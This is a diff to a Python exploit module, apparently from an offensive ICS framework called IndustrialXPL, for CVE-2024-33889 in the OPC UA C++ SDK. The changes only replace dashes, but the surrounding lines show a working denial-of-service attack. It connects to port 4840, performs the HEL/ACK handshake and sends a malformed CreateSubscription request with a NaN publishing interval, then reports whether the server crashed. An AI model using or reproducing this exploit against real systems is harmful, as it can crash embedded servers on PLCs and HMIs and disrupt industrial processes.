@@ -1,4 +1,4 @@
-"""IndustrialXPL CVE Module — CVE-2024-33889 (OPC Foundation UA C++ SDK Null Pointer DoS).
+"""IndustrialXPL CVE Module - CVE-2024-33889 (OPC Foundation UA C++ SDK Null Pointer DoS).
 
 Null pointer dereference in OPC Foundation UA C++ SDK when processing
 malformed OPC-UA subscription or monitored-item service requests.
@@ -24,7 +24,7 @@ from industrialxpl.core.exploit import (
 
 class Exploit(Exploit):
     __info__ = {
-        "name":             "CVE-2024-33889 — OPC Foundation UA C++ SDK Null Pointer Deref DoS",
+        "name":             "CVE-2024-33889 - OPC Foundation UA C++ SDK Null Pointer Deref DoS",
         "description":      "NULL pointer deref in OPC UA C++ SDK < 1.04.368 via malformed CreateSubscription request. Crashes embedded OPC-UA servers on PLCs/HMIs. CVSS 7.5.",
         "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
         "references":       (
@@ -63,7 +63,7 @@ class Exploit(Exploit):
         """Craft malformed CreateSubscription with invalid publishing interval (NaN float)."""
         # Minimal OPC-UA MSG frame with CreateSubscription service (NodeId 0x13D)
         # Publishing interval set to -1.0 (negative) or NaN to trigger NULL deref
-        invalid_interval = struct.pack("<d", float("nan"))  # NaN double — triggers NULL deref
+        invalid_interval = struct.pack("<d", float("nan"))  # NaN double - triggers NULL deref
 
         # Simplified CreateSubscription body
         body = (
@@ -104,7 +104,7 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "CVE-2024-33889 — OPC Foundation UA C++ SDK Null Pointer Deref DoS\n"
+                    "CVE-2024-33889 - OPC Foundation UA C++ SDK Null Pointer Deref DoS\n"
                     "CVSS 7.5 | Port 4840 | OPC UA C++ SDK < 1.04.368\n\n"
                     "Step 1: TCP connect to port 4840\n"
                     "Step 2: Send OPC-UA HEL (Hello) → receive ACK\n"
@@ -128,7 +128,7 @@ class Exploit(Exploit):
                 print_warning(f"[CVE-2024-33889] Unexpected response to HEL: {ack[:8].hex()}")
                 s.close()
                 return
-            print_status("[CVE-2024-33889] HEL/ACK OK — sending malformed CreateSubscription (NaN interval) ...")
+            print_status("[CVE-2024-33889] HEL/ACK OK - sending malformed CreateSubscription (NaN interval) ...")
             payload = self._build_malformed_create_subscription()
             s.sendall(payload)
             import time; time.sleep(1)
@@ -136,12 +136,12 @@ class Exploit(Exploit):
                 resp = s.recv(64)
                 s.close()
                 if not resp:
-                    print_success("[CVE-2024-33889] Empty response after payload — server likely crashed!")
+                    print_success("[CVE-2024-33889] Empty response after payload - server likely crashed!")
                 else:
-                    print_info(f"[CVE-2024-33889] Server responded ({len(resp)} bytes) — may be patched or not vulnerable")
+                    print_info(f"[CVE-2024-33889] Server responded ({len(resp)} bytes) - may be patched or not vulnerable")
             except ConnectionResetError:
-                print_success("[CVE-2024-33889] Connection reset — NULL deref triggered, server crashed!")
+                print_success("[CVE-2024-33889] Connection reset - NULL deref triggered, server crashed!")
             except TimeoutError:
-                print_success("[CVE-2024-33889] Timeout — server unresponsive after payload — crash likely!")
+                print_success("[CVE-2024-33889] Timeout - server unresponsive after payload - crash likely!")
         except Exception as e:
             print_error(f"[CVE-2024-33889] {e}")
